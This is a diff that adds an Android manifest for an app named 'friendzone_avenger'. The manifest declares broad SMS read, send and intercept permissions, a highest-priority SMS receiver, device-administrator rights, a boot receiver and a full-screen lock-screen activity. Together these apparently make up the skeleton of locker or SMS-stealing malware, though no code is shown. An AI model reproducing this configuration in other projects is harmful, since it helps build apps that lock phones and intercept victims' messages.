@@ -1,0 +1,111 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.developer.crdzbird.friendzone_avenger">
+
+    <uses-sdk
+        android:minSdkVersion="8"
+        android:targetSdkVersion="19" />
+
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/logo_avenger"
+        android:label="@string/app_name"
+        android:supportsRtl="true"
+        android:manageSpaceActivity="com.developer.crdzbird.friendzone_avenger.LockScreen"
+        android:theme="@style/AppTheme">
+
+        <!-- Activity MainActivity -->
+        <activity
+            android:name="com.developer.crdzbird.friendzone_avenger.MainActivity"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:excludeFromRecents="true"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Activity LockScreen -->
+        <activity
+            android:name="com.developer.crdzbird.friendzone_avenger.LockScreen"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:label="@string/app_name"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" >
+        </activity>
+
+        <!-- Activity UninstallAdminDevice -->
+        <activity
+            android:name="com.developer.crdzbird.friendzone_avenger.UninstallAdminDevice"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:label="@string/app_name"
+            android:launchMode="singleTop"
+            android:theme="@style/Theme.Transparent" >
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <!-- IntentServiceClass -->
+        <service android:name="com.developer.crdzbird.friendzone_avenger.IntentServiceClass" />
+
+        <!-- AdminReciever -->
+        <receiver
+            android:name="com.developer.crdzbird.friendzone_avenger.AdminReciever"
+            android:description="@string/sample_device_admin_description"
+            android:label="@string/sample_device_admin"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_test" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMSReceiver -->
+        <receiver android:name="com.developer.crdzbird.friendzone_avenger.SMSReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- BootReceiver -->
+        <receiver
+            android:name="com.developer.crdzbird.friendzone_avenger.BootReceiver"
+            android:enabled="true" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- AlarmReceiver -->
+        <receiver
+            android:name="com.developer.crdzbird.friendzone_avenger.AlarmReceiver"
+            android:enabled="true"
+            android:process=":remote" >
+        </receiver>
+
+
+    </application>
+
+</manifest>
